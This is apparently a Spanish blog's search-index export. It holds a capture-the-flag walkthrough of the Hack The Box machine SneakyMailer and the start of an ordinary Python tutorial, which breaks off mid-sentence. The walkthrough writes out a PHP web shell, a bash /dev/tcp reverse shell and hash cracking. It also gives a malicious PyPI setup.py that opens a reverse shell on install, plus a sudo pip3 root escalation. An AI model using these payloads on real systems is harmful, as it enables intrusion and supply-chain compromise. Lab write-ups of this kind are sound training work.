htbpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Htrpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:HtAhora provaremos conectarnos con telnet al puerto 143 con esas credenciales.  Puedes guiarte de este articulo donde se explica a detalle como realizar la conexión con telnet y hacer uso de los parametros.  Connect-to-imap-server-with-telnet❯ telnet 10. 10. 10. 197 143Trying 10. 10. 10. 197. . . Connected to 10. 10. 10. 197. Escape character is '^]'. * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information. a1 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)a1 OK LOGIN Ok. a2 LIST     * * LIST (\Unmarked \HasChildren)  .    INBOX * LIST (\HasNoChildren)  .    INBOX. Trash * LIST (\HasNoChildren)  .    INBOX. Sent * LIST (\HasNoChildren)  .    INBOX. Deleted Items * LIST (\HasNoChildren)  .    INBOX. Sent Items a2 OK LIST completeda3 EXAMINE  INBOX. Trash * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 0 EXISTS* 0 RECENT* OK [UIDVALIDITY 590600304] Ok* OK [MYRIGHTS  acdilrsw ] ACLa3 OK [READ-ONLY] Oka4 EXAMINE  INBOX. Sent * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 0 EXISTS* 0 RECENT* OK [UIDVALIDITY 590600538] Ok* OK [MYRIGHTS  acdilrsw ] ACLa4 OK [READ-ONLY] Oka5 EXAMINE  INBOX. Deleted Items * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 0 EXISTS* 0 RECENT* OK [UIDVALIDITY 589481592] Ok* OK [MYRIGHTS  acdilrsw ] ACLa5 OK [READ-ONLY] Oka6 EXAMINE  INBOX. Sent Items * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 2 EXISTS* 0 RECENT* OK [UIDVALIDITY 589480766] Ok* OK [MYRIGHTS  acdilrsw ] ACLa6 OK [READ-ONLY] OkExaminado la ultima bandeja encontramos 2 correos existentes y visualizando el primer correo optenemos unas credenciales del usuario developer a7 FETCH 1 BODY[]* 1 FETCH (BODY[] {2167}MIME-Version: 1. 0To: root &lt;root@debian&gt;From: Paul Byrd &lt;paulbyrd@sneakymailer. htb&gt;Subject: Password resetDate: Fri, 15 May 2020 13:03:37 -0500Importance: normalX-Priority: 3Content-Type: multipart/alternative;	boundary= _21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_ --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/plain; charset= utf-8 Hello administrator, I want to change this password for the developer accou=ntUsername: developerOriginal-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CPlease notify me when you do it=20--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/html; charset= utf-8 &lt;html xmlns:o=3D urn:schemas-microsoft-com:office:office  xmlns:w=3D urn:sc=hemas-microsoft-com:office:word  xmlns:m=3D http://schemas. microsoft. com/of=fice/2004/12/omml  xmlns=3D http://www. w3. org/TR/REC-html40 &gt;&lt;head&gt;&lt;meta ht=tp-equiv=3DContent-Type content=3D text/html; charset=3Dutf-8 &gt;&lt;meta name==3DGenerator content=3D Microsoft Word 15 (filtered medium) &gt;&lt;style&gt;&lt;!--/* Font Definitions */@font-face	{font-family: Cambria Math ;	panose-1:2 4 5 3 5 4 6 3 2 4;}@font-face	{font-family:Calibri;	panose-1:2 15 5 2 2 2 4 3 2 4;}/* Style Definitions */p. MsoNormal, li. MsoNormal, div. MsoNormal	{margin:0in;	margin-bottom:. 0001pt;	font-size:11. 0pt;	font-family: Calibri ,sans-serif;}. MsoChpDefault	{mso-style-type:export-only;}@page WordSection1	{size:8. 5in 11. 0in;	margin:1. 0in 1. 0in 1. 0in 1. 0in;}div. WordSection1	{page:WordSection1;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D #954F72 &gt;&lt;div cla=ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=l&gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--)a7 OK FETCH completed. Como ahora disponemos de credenciales nuevas:  developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CVolemos a tratar de conectarnos por ftp y esta vez la conexión es exitosa. ❯ ftp 10. 10. 10. 197Connected to 10. 10. 10. 197. 220 (vsFTPd 3. 0. 3)Name (10. 10. 10. 197:fmiracle): developer331 Please specify the password. Password:230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxr-x  8 0    1001     4096 Jun 30 2020 dev226 Directory send OK. ftp&gt; cd dev250 Directory successfully changed. ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x  2 0    0      4096 May 26 2020 cssdrwxr-xr-x  2 0    0      4096 May 26 2020 img-rwxr-xr-x  1 0    0      13742 Jun 23 2020 index. phpdrwxr-xr-x  3 0    0      4096 May 26 2020 jsdrwxr-xr-x  2 0    0      4096 May 26 2020 pypidrwxr-xr-x  4 0    0      4096 May 26 2020 scss-rwxr-xr-x  1 0    0      26523 May 26 2020 team. phpdrwxr-xr-x  8 0    0      4096 May 26 2020 vendor226 Directory send OK. ftp&gt;Despues de conectarnos visualizamos un directorio dev y dentro un contenido de nombre team. php, que curiosamente era la ruta de la pagina donde estaban expuestos los correos. Para poder saber si tenemos permiso de escritura intentaremos subir un archivo de nombre cmd. php que con el uso de la función shell_exec me ejecute un comando a nivel de sistema que vamos a controlar con el parametro cmd &lt;?php  echo  &lt;pre&gt;  . shell_exec($_REQUEST['cmd']) .  &lt;/pre&gt; ;?&gt;Comprobamos que efectivamente si podemos subir el archivo ftp&gt; put cmd. phplocal: cmd. php remote: cmd. php200 PORT command successful. Consider using PASV. 150 Ok to send data. d226 Transfer complete. 69 bytes sent in 0. 00 secs (811. 8411 kB/s)ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. --wxrw-rw-  1 1001   1001      69 Apr 08 19:15 cmd. phpdrwxr-xr-x  2 0    0      4096 May 26 2020 cssdrwxr-xr-x  2 0    0      4096 May 26 2020 img-rwxr-xr-x  1 0    0      13742 Jun 23 2020 index. phpdrwxr-xr-x  3 0    0      4096 May 26 2020 jsdrwxr-xr-x  2 0    0      4096 May 26 2020 pypidrwxr-xr-x  4 0    0      4096 May 26 2020 scss-rwxr-xr-x  1 0    0      26523 May 26 2020 team. phpdrwxr-xr-x  8 0    0      4096 May 26 2020 vendor226 Directory send OK. ftp&gt;Visitamos la url, pero esta vez apuntaremos al fichero que subimos.  El servicio nos reporta un codigo de estado 400 lo que corresponde a que el archivo no existe… Pero dado a que existe un directorio dev podemos pensar que puede ser un posible subdominio, asi que usaremos gobuster para tratar de enumerar posibles subdominios validos existentes y usaremos el diccionario subdomains-top1million-5000. txt del repositorio de seclists    Gobuster     SecLists  ❯ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000. txt -u http://sneakycorp. htb/ -t 200===============================================================Gobuster v3. 1. 0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:     http://sneakycorp. htb/[+] Method:    GET[+] Threads:   200[+] Wordlist:   /opt/SecLists/Discovery/DNS/subdomains-top1million-5000. txt[+] User Agent:  gobuster/3. 1. 0[+] Timeout:   10s===============================================================2023/04/08 23:21:48 Starting gobuster in VHOST enumeration mode===============================================================Found: dev. sneakycorp. htb (Status: 200) [Size: 13742]                           ===============================================================2023/04/08 23:21:58 Finished===============================================================Pues gobuster nos reporta que el subdominio es valido, lo que quiere decir que el archivo que subimos antes existe, pero bajo ese subdominio. Procedemos a subir nuevamente el archivo ya que a intervalos de tiempo nos lo borra ftp&gt; put cmd. phplocal: cmd. php remote: cmd. php200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 69 bytes sent in 0. 00 secs (990. 9237 kB/s)ftp&gt;Volvemos a visitar la url esta vez apuntando al subdominio y al archivo subido no sin antes agregar el subdominio a nuestro /etc/hosts ❯ echo  10. 10. 10. 197 dev. sneakycorp. htb  &gt;&gt; /etc/hostsEsta vez si podemos apuntar al archivo cmd. php y con el parametro cmd tal y como lo habiamos especificado, podemos ejecutar comandos.  Lo siguiente sera ganar acceso a la maquina, mandandonos una shell reversa a nuestra maquina local, ello lo haremos con bash con el comando bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 16. 2/443 0&gt;&amp;1' No olvidemos poner los &amp; en urleconde %26 para evitar problemas, y enviamos la petición Nos ponemos en escucha y recimos la conexión como el usuario www-data ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 197. Ncat: Connection from 10. 10. 10. 197:37818. bash: cannot set terminal process group (734): Inappropriate ioctl for devicebash: no job control in this shellwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ whoamiwhoamiwww-dataComo siempre al ser una maquina linux hacemos un tratamiento de la tty para que sea full interactiva y ajustamos el tamaño de las proporciones de la pantall. www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ export TERM=xtermwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ export SHELL=bashwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ stty rows 48 columns 184Una vez en la maquina listamos los procesos corriendo y vemos uno correspondiente a pypi www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ ps -faux | grep 5000www-data 7185 0. 0 0. 0  3084  824 pts/0  S+  19:49  0:00 |              \_ grep 5000pypi    741 0. 0 0. 6 36804 25824 ?    Ss  17:09  0:08 /var/www/pypi. sneakycorp. htb/venv/bin/python3 /var/www/pypi. sneakycorp. htb/venv/bin/pypi-server -i 127. 0. 0. 1 -p 5000 -a update,download,list -P /var/www/pypi. sneakycorp. htb/. htpasswd --disable-fallback -o /var/www/pypi. sneakycorp. htb/packageswww-data@sneakymailer:~/dev. sneakycorp. htb/dev$Podemos ver que se establece un tipo de conexión procediente de un archivo asi que procederemos a leeerlo www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ cat /var/www/pypi. sneakycorp. htb/. htpasswdpypi:$apr1$RV5c5YVs$U9. OTqF5n8K4mxWpSSR/p/Vemos una contraseña encryptada que procederemos a crackearla por fuerza bruta con john ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashWarning: detected hash type  md5crypt , but the string is also recognized as  md5crypt-long Use the  --format=md5crypt-long  option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statussoufianeelhaoui (?)1g 0:00:00:08 DONE (2023-04-08 23:53) 0. 1172g/s 419023p/s 419023c/s 419023C/s soulfire1. . souderton16Use the  --show  option to display all of the cracked passwords reliablySession completedObtenemos nuevas credenciales pypi:soufianeelhaoui Como vimos que por detras esta configurado un nginx vamos a listar los sitios disponibles del directorio sites-available Encotramos el subdominio pypi. sneakycorp. htb que esta en escucha por el puerto 8080 www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ cat /etc/nginx/sites-available/pypi. sneakycorp. htb server {	listen 0. 0. 0. 0:8080 default_server;	listen [::]:8080 default_server;	server_name _;}server {	listen 0. 0. 0. 0:8080;	listen [::]:8080;	server_name pypi. sneakycorp. htb;	location / {		proxy_pass http://127. 0. 0. 1:5000;		proxy_set_header Host $host;		proxy_set_header X-Real-IP $remote_addr;	}}Agregamos el subdominio al /etc/hosts ❯ echo  10. 10. 10. 197 pypi. sneakycorp. htb  &gt;&gt; /etc/hostsLo abrimos en el navegador Como vemos un pypi server lo que podriamos hacer es tratar de crearnos nuestro propio paquete malicioso de pypi y tratar de subirlo a la maquina victima e intentar colar un comando en la maquina victima. Ahora la pregunta es como creamos un paquete en python? Solo debes seguir la guia de este recurso donde se explica a detalle como hacerlo  Create-a-private-python-packageLa estructura al crear un paquete debe ser similar a esta: linode_example/  linode_example/    __init__. py  setup. py  setup. cfg  README. mdEntonces procederemos a crear una estructura similar en nuestra maquina en este caso pondre de nombre a los directorios como package ❯ ls package  setup. cfg  setup. py❯ tree. ├── package│   ├── __init__. py│   └── package├── setup. cfg└── setup. py2 directories, 3 filesLo siguiente sera editar el setup. py, donde ademas añadiremos un codigo para ejecutarnos una reverse shell que se ejecutara cuando se inicie el setup. py from setuptools import setupimport socket,subprocess,oss=socket. socket(socket. AF_INET,socket. SOCK_STREAM)s. connect(( 10. 10. 16. 2 ,443))os. dup2(s. fileno(),0)os. dup2(s. fileno(),1)os. dup2(s. fileno(),2)p=subprocess. call([ /bin/sh , -i ])setup(  name='linode_example',  #packages=['linode_example'],  description='Hello world enterprise edition',  version='0. 1',  url='http://github. com/example/linode_example',  author='Linode',  author_email='docs@linode. com',  keywords=['pip','linode','example']  )Comentar o borrar la linea de packages=['linode_example'] ya que suele dar problema. Ahora lo que tenemos que hacer es que el servidor de la maquina victima al momento de instalar el paquete me ejecute la reverse shell y eso lo hariamos creando un archivo . pypirc donde definamos cual es el repositorio al cual te quieras conectar y las credenciales de autenticación que de antes la tenemos. ❯ /bin/cat ~/. pypirc[distutils]index-servers = sneakypwned[sneakypwned]repository: http://pypi. sneakycorp. htb:8080/username: pypipassword: soufianeelhaouiPor ultimo sera ejecutar el siguiente comando para tratar de cargar el paquete en la maquina victima python3 setup. py sdist upload -r linode Donde reeemplazaremos linode por el nombre que pusimos el el index-servers en el . pypirc que en nuestro caso es sneakypwned python3 setup. py sdist upload -r sneakypwnedEjecutamos el setup. py y nos ponemos en escucha con ncat ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 16. 2. Ncat: Connection from 10. 10. 16. 2:46076. # whoamiroot# pwd/home/fmiracle/Machines/Sneakymailer/content/create#Pero vemos que nos hace una conexión a nuestra propia maquina, esto es por que primero se ejecuta la conexión locamente Lo que debemos hacer es volver a ponernos en escucha con ncat y salir de nuestra conexión local con un exit esto hara que se ejecute la conexión esta vez de la maquina victima. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 16. 2. Ncat: Connection from 10. 10. 16. 2:37168. # whoamiroot# pwd/home/fmiracle/Machines/Sneakymailer/content/create# exitrunning sdistrunning egg_infowriting linode_example. egg-info/PKG-INFOwriting dependency_links to linode_example. egg-info/dependency_links. txtwriting top-level names to linode_example. egg-info/top_level. txtreading manifest file 'linode_example. egg-info/SOURCES. txt'writing manifest file 'linode_example. egg-info/SOURCES. txt'warning: sdist: standard file not found: should have one of README, README. rst, README. txt, README. mdrunning checkcreating linode_example-0. 1creating linode_example-0. 1/linode_example. egg-infocreating linode_example-0. 1/packagecopying files to linode_example-0. 1. . . copying setup. cfg -&gt; linode_example-0. 1copying setup. py -&gt; linode_example-0. 1copying linode_example. egg-info/PKG-INFO -&gt; linode_example-0. 1/linode_example. egg-infocopying linode_example. egg-info/SOURCES. txt -&gt; linode_example-0. 1/linode_example. egg-infocopying linode_example. egg-info/dependency_links. txt -&gt; linode_example-0. 1/linode_example. egg-infocopying linode_example. egg-info/top_level. txt -&gt; linode_example-0. 1/linode_example. egg-infocopying package/__init__. py -&gt; linode_example-0. 1/packageWriting linode_example-0. 1/setup. cfgCreating tar archiveremoving 'linode_example-0. 1' (and everything under it)running uploadSubmitting dist/linode_example-0. 1. tar. gz to http://pypi. sneakycorp. htb:8080/Server response (200): OKRecibimos la conexión desde la maquina victima como el usuario low ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 197. Ncat: Connection from 10. 10. 10. 197:45570. $ whoamilow$ hostname -I10. 10. 10. 197 dead:beef::250:56ff:feb9:6b16 Realizamos nuevamente un tratamiento de la tty como ya hicimos anteriormente, nos dirigimos al directorio personal del usuario y podemos visualizar la primera flag user. txt low@sneakymailer:/$ cd /homelow@sneakymailer:/home$ lslow vmaillow@sneakymailer:/home$ cd low/low@sneakymailer:~$ cat user. txt 4a39c61b14f3e1c7c83014390f90942elow@sneakymailer:~$ Escalada de privilegios #: Ejecutamos el comando sudo -l para ver si tenemos privilegios a nivel de sudoers y vemos que tenemos uno asociado al comando pip3 el cual podemos ejecutar como root de forma temporal sin requerir contraseña. low@sneakymailer:~$ sudo -lsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionMatching Defaults entries for low on sneakymailer:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser low may run the following commands on sneakymailer:  (root) NOPASSWD: /usr/bin/pip3Lo siguiente sera dirigirnos a nuestra web de confianza  https://gtfobins. github. io/ahi podemos ver que si tenemos el privilegio de sudo en pip3, debemos ejecutar los siguentes comandos y nos convertiremos en el usuario root low@sneakymailer:~$ TF=$(mktemp -d)low@sneakymailer:~$ echo  import os; os. execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')  &gt; $TF/setup. pylow@sneakymailer:~$ sudo pip install $TFsudo: unable to resolve host sneakymailer: Temporary failure in name resolution[sudo] password for low: low@sneakymailer:~$ TF=$(mktemp -d)low@sneakymailer:~$ echo  import os; os. execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')  &gt; $TF/setup. pylow@sneakymailer:~$ sudo pip3 install $TFsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionProcessing /tmp/tmp. 25RDYk7IwK# whoamirootFinalmente podemos dirigirnos al directorio de root y visualizar la segunda flag root. txt :) # cd /root# cat root. txt25ae2132a2ff299928b234e186ad53ec"
    }, {
    "id": 40,
    "url": "http://localhost:4000/articulos/Python3",
    "title": "Aprende Python desde cero a avanzado curso completo",
    "body": "2023/03/30 - En esta ocasion hablaremos del lenguaje de programacion Python3, realizaremos todo un curso completo desde lo mas basico y explicaremos todo lo escencial para que se pueda llegar a dominar este lenguaje.  El curso se ira actualizando constantemente! - Ultima actualización 14 - 06 - 2023 Que es Python3?Python3 es un lenguaje de programación ampliamente utilizado en las aplicaciones web, el desarrollo de software, la ciencia de datos y el machine learning. Es preferido entre los desarrolladores porque es eficiente y fácil de aprender, además de que se puede ejecutar en muchas plataformas diferentes, se integra bien a todos los tipos de sistemas y aumenta la velocidad del desarrollo. El software podemos descargarlo gratis de su pagina oficial. Indice y Estructura:  Que es Python3 Sintaxis Variables     Tipos de Variables   Asignación Multiple de Variables   Sintaxis de Variables    Strings     Indexación   Slicing   Stride   Modificación de Strings   Strings de multiples lineas    Numeros     Numeros Enteros   Numeros Flotantes   Numeros Complejos    Comentarios     Comentarios de Varias Lineas    Operadores Aritmeticos     Suma y Resta         Sumar y restar datos Numericos     Sumar y restar datos Strings          Multiplicación y División         Multiplicar y dividir datos Numericos     Multiplicar y dividir datos Strings          Modulo   Exponencial   Division Entera    Operadores de Asignación Booleanos Operadores de Comparación     Comparación entre datos numericos   Comparación entre datos strings    Operadores de Identidad Operadores de Pertenencia Operadores Logicos     Operador not   Operador or   Operador and    Listas     Acceso a elementos de una lista   Operaciones con listas   Listas anidadas   Las listas son mutables    Funciones     Funciones Personalizadas   Argumentos de las Funciones         Argumentos Posicionales     Argumentos de Palabras Clave     Parametros con Valores por Defecto          Sentencia Return   Docstrings   Funciones Propias de Python    Tuplas     Funcionamiento de las Tuplas   Cuando utilizar una Tupla en vez de una Lista   Tuplas y tipos de datos Numericos   Packing y Unpacking - Empaquetado y Desempaquetado    Diccionarios     Acceso a los elementos de un Diccionario   Elementos de un Diccionario   Operaciones con Diccionarios    Sets     Funcionamiento de un Set   Frozenzet    Nonetype     Funcionamiento    Estructuras de Control de Flujo     Sentencia If, elif y else         Sentencia If     Clausula Else     Clausula Elif     Sentencia If en una linea     Operador Condicional          Sentencia For         Objetos Iterables     Next     Uso de else en un bucle For     Range          Sentencia While         Uso de else en una bucle While     Bucles Infinitos     While en una linea          Sentencia break, continue y pass         Sentencia break     Sentencia continue     Sentencia pass           Python Orientado a ObjetosSintaxis #Cuando hablamos de la sintaxis en Python3, nos referimos como en todo lenguaje al correcto uso y orden de las palabras que utilizamos para comunicarnos. Por ello, en Python3 también es necesario cumplir ciertos requisitos a la hora de expresarnos. Comenzaremos con la sintaxis tipica que nos ayuda a imprimir los valores concretamente su nombre es print que viene a ser una funcion interna de Python que recibe una variable o tipo de dato y nos lo muestra por pantalla, por ahora solo hay que tener presente el concepto de print ya que mas adelante profundizaremos en los demas conceptos que nos ayudaran a comprender mejor como funciona este lenguaje. print( Hola Python3 )Hola Python3Variables #Una variable es un elemento de un lenguaje de programación que tiene asignado un valor determinado. Para crear una variable en Python3 debemos proporcionarle un nombre y asignarle un valor utilizando el símbolo =. variable =  Hola Python3 print(variable)Hola Python3Ahora el valor asignado a la variable puede cambiar a lo largo del codigo a otra difierente. variable =  Hola Python3 print(variable)Hola Python3variable2 =  Adios Python3 print(variable)Adios Python3Tipos de Variables: Existen 4 tipos de variables principales o primitivas en Python3, concretamente estas son: Tipoint: Para representar numeros enteros. Tipo string: Para representar texto o cadenas. Tipo boolean: Para representar datos binarios, es decir que pueden tomar los valores True o False. Tipo float: Para representar numeros con decimales.       Representacion   Tipo         numeros enteros   int       cadenas de texo   string       numeros decimales   float       dato binario(True o False)   boolean   Definimos un conjunto de variables segun su tipo y usamos la funcion reservada de python type() para ver el tipo de variable segun su asignacion: variable1 = 10variable4 = 2. 4variable2 =  Hola Python variable3 = Truevariable4 = 2. 4type(variable1)inttype(variable2)strtype(variable3)booltype(variable4)floatAsignación Multiple de Variables: En Python3 podemos asignar una variable a otra variable diferente. variable =  Hola Python3 variable2 = variableprint(variable2)Hola Python3Sintaxis de Variables: En Python3 se debe cumplir con las reglas sintácticas definidas por el leguaje. A continuación indicamos las reglas que debemos cumplir cuando definimos el nombre de una variable:  Las variables en Python3 pueden tener cualquier longitud y pueden consistir en letras mayúsculas y minúsculas A-Z, a-z, dígitos del 0-9 y el carácter de subrayado o subguion __variable =  Hola Python3 print(_variable)Hola Python3vAriAbLe =  Hola Python3 print(vAriAbLe)Hola Python3variable_1_1 =  Hola Python3 print(variable_1_1)Hola Python3 Si no se cumple con las reglas definidas de sintaxys, emitiran un error variable$ =  Hola Python3   File  &lt;iPython3-input-12-f520f3dd0eb3&gt; , line 1   variable$ =  Hola Python3      ^ SyntaxError: invalid syntax El nombre de una variable puede contener dígitos, pero el primer caracter de un nombre de variable no puede ser un dígito.  1variable =  Hola Python3   File  &lt;iPython3-input-13-905ee4ad3fed&gt; , line 1   1variable =  Hola Python3    ^ SyntaxError: invalid syntax El nombre de las variables en Python3 es sensible a mayúsculas y minúsculas  Variable1 =  Hola Python3   print(variable1)  ---------------------------------------------------------------------------  NameError                 Traceback (most recent call last)  &lt;iPython3-input-15-32693f267891&gt; in &lt;module&gt;  ----&gt; 1 print(variable1)  NameError: name 'variable1' is not definedStrings #Un string se corresponde con un conjunto de caracteres que forman una cadena de texto. La sintaxis que debemos utilizar para definir strings en Python consiste en situar los caracteres entre   o ' variable1 =  Esto es mi primer string variable2 = 'Esto es mi segunda string'La flexibilidad de definir string con el caracter “ y el caracter ‘ nos permite definir cadenas de texto que contienen esos mismos caracteres. variable1 = 'Los tipos strings pueden definirse con el caracter  'variable2 =  Los tipos strings pueden definirse con el caracter ' print(variable1)Los strings pueden definirse con el caracter  print(variable2)Los strings pueden definirse con el caracter 'Indexación: En muchos tipos de datos en Python3 se puede acceder a los elementos individuales de un conjunto de datos directamente mediante un índice numérico o un valor clave. Este proceso se denomina indexación. En Python3, las cadenas son secuencias ordenadas de caracteres, y por lo tanto pueden ser indexadas de esta manera. Se puede acceder a los caracteres individuales de una cadena especificando el nombre de la cadena seguido de un número entre corchetes []. El primer carácter de la cadena tendra el índice 0, el siguiente el índice 1, y así sucesivamente. El índice del último carácter será la longitud de la cadena menos uno. lenguaje =  Python lenguaje[0]'P'lenguaje[2]'t'Podemos tambien utilizar números negativos para extraer los caracteres por el final de la cadena de texto, donde -1 seria la parte final y asi sucesivamente de derecha a izquierda. lenguaje[-1]'n'lenguaje[-3]'h'Slicing: Python3 permite una sintaxis específica de indexación que extrae subcadenas de una cadena de texto, a esto se denomina ‘slicing. La sintaxis que se utiliza para extraer una subcadena de una cadena de nombre micadena es de la forma micadena[x:y], esto devuelve la parte de la cadena micadena que comienza en la posición x,y termina en la posición y; con la exepción de que no se incluye el último caracter. lenguaje =  Hola Python lenguaje[0:4]'Hola'lenguaje[-6:-1]'Pytho'Podemos observar que efectivamente no se incluye el ultimo caracter que se especifica: ojo tener en cuenta que los espacios tambien son caracteres correspondientes a una cadena vacia Pero que pasaria entonces si no indicamos uno de los numeros: lenguaje =  Hola Python lenguaje[-6:]'Python'lenguaje[5:]'Python'Si no indicamos alguno de los numeros lo que hace Python3 es leer hasta el final. Stride: Es una variante más del slicing. Si se añade un : adicional y un tercer índice, se designa una stride, que indica cuantos caracteres saltar hasta obtener el siguiente caracter. Este salto lo hara contando el propio caracter. lenguaje =  Hola Python lenguaje[0:4:2]'Hl'lenguaje[0:4:1]'Hola'nombre[0:8:3]'ha'Modificación de Strings: Una string es un tipo de dato que en Python3 se considera inmutable, esto quiere decir que no podemos modificar una parte de un string asociada a una variable lenguaje =  Python lenguaje[2]'t'lenguaje[2] = 'a'---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-37-3f77b4874756&gt; in &lt;module&gt;----&gt; 1 lenguaje[2] = 'a'TypeError: 'str' object does not support item assignmentPero a pesar de no poderse modificar el contenido de una string, si se puede asignar un string diferente a la variable. lenguaje =  golang print(lenguaje)golangStrings de multiples lineas: Si en alguna ocasion queremos definir strings de varias lineas podemos hacerlo de varias formas en Python3 Una de ellas seria introducir el caracter \n en la posicion de la cadena donde queremos que realize el salto de linea lenguaje =  Mi\nlenguaje\nfavorito\nes\nPython print(lenguaje)MilenguajefavoritoesPythonOtra opción tambien podria usar los caracteres     lenguaje =    MilenguajefavoritoesPython   print(lenguaje)MilenguajefavoritoesPythonNumerosExisten 3 tipos de datos numéricos: enteros int, números de punto flotante float y números complejos. Numeros Enteros: Los números enteros son aquellos que no tienen parte decimal. En Python3 se referencian con la palabra int. num = 10No olvidemos que es muy importante la diferencia de un número entero y una cadena de texto que representa un número entero. num = 10num =  10 Podemos convertir una cadena de texto que representa un número entero en un valor numérico utilizando la función int() numero =  10 print(numero)'10'numero2 = int(numero)print(numero2)10Para separar algunos dígitos para que sea más facil de leer. No podemos usar el . o , , para esto Python3 nos da la opcion de usar _: numero = 5000000print(numero)5000000numero2 = 5_000_000print(numero2)5000000No hay límite en el tamaño de los números enteros que podemos definir, ya que se pueden definir números enteros tan grandes como la memoria de nuestro sistema soporte. numeroprint(numeroumeros Flotantes: Los números flotantes son aquellos que tienen una parte decimal, en Python3 se referencian con la palabra float. numero = 10. 5De igual manera que con los números enteros, se puede convertir una cadena de texto que representa un número flotante a un valor numérico utilizando la función float() numero =  12. 4 print(numero)'12. 4'numero2 = float(numero)print(numero2)12. 4Existen tres formas de representarlos en Python3. numero1 = 1000. 0numero2 = 1_000. 0numero3 = 1e3print(numero1)1000. 0print(numero2)1000. 0print(numero3)1000. 0A diferencia que los números enteros, los número de flotantes si tienen un tamaño máximo en Python3. Aunque el tamaño máximo dependera de nuestro sistema, las cifras cercanas o mayores a 2e400 que equivale a (2x10)^400 suelen superar el tamaño máximo. numero = 2e400print(numero)infPython3 devuelve inf haciendo referencia a infinito. Numeros complejos: Hay pocos lenguajes de programacion que ofrecen soporte integrado para números complejos y Python3 es uno de ellos. Aunque los números complejos no suelen aparecer fuera de los dominios de la computación científica, pueden ser de gran utilidad en dominios que 